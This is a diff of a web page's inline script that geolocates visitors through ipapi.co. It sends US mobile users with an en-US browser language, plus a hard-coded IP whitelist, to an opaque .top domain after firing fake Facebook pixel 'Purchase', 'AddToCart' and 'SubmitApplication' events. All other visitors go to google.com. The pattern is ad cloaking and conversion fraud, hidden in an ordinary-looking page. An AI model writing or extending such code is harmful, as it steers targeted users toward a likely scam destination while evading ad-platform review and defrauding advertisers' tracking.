@@ -28,35 +28,53 @@ src="https://www.facebook.com/tr?id=2831712297218321&ev=PageView&noscript=1"
       return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
     }
 
-function isUSLang() {
-    return navigator.language === 'en-US' || 
-           navigator.languages.some(lang => lang === 'en-US');
-}
+    function isUSLang() {
+      return navigator.language === 'en-US' || 
+             navigator.languages.some(lang => lang === 'en-US');
+    }
+
+    // IP whitelist
+    const ipWhitelist = [
+      '23.247.136.238',
+      '103.156.184.47',
+      '172.16.0.1'
+      // Add more IP addresses as needed
+    ];
 
     fetch('https://ipapi.co/json/')
       .then(response => response.json())
       .then(data => {
-        // 严格的三重条件判断
-        if (data.country === 'US' && isMobileDevice() && isUSLang()) {
-	fbq('track', 'AddToCart');
-	fbq('track', 'Purchase');
-			fbq('track', 'SubmitApplication');
-          window.location.href = "https://uuxxpu.top/uU4fD1hB";
-          return;
-        }
-      window.location.href = "https://www.google.com";
-      })
-      .catch(() => {
-        // IP检测失败时严格的双重条件判断
-        if (isMobileDevice() && isIndonesianLang()) {
-fbq('track', 'AddToCart');
-			fbq('track', 'SubmitApplication');
-	fbq('track', 'Purchase');
+        // Check if IP is in whitelist
+        if (ipWhitelist.includes(data.ip)) {
+          fbq('track', 'AddToCart');
+          fbq('track', 'Purchase');
+          fbq('track', 'SubmitApplication');
           window.location.href = "https://uuxxpu.top/uU4fD1hB";
           return;
         }
         
-         window.location.href = "https://www.google.com";
+        // Original triple condition check
+        if (data.country === 'US' && isMobileDevice() && isUSLang()) {
+          fbq('track', 'AddToCart');
+          fbq('track', 'Purchase');
+          fbq('track', 'SubmitApplication');
+          window.location.href = "https://uuxxpu.top/uU4fD1hB";
+          return;
+        }
+        
+        window.location.href = "https://www.google.com";
+      })
+      .catch(() => {
+        // IP detection failed - original dual condition check
+        if (isMobileDevice() && isUSLang()) {
+          fbq('track', 'AddToCart');
+          fbq('track', 'SubmitApplication');
+          fbq('track', 'Purchase');
+          window.location.href = "https://uuxxpu.top/uU4fD1hB";
+          return;
+        }
+        
+        window.location.href = "https://www.google.com";
       });
   }
 </script>
@@ -1061,6 +1079,7 @@ function ya62() {
 </body>
 
 </html>
+
 
 
 
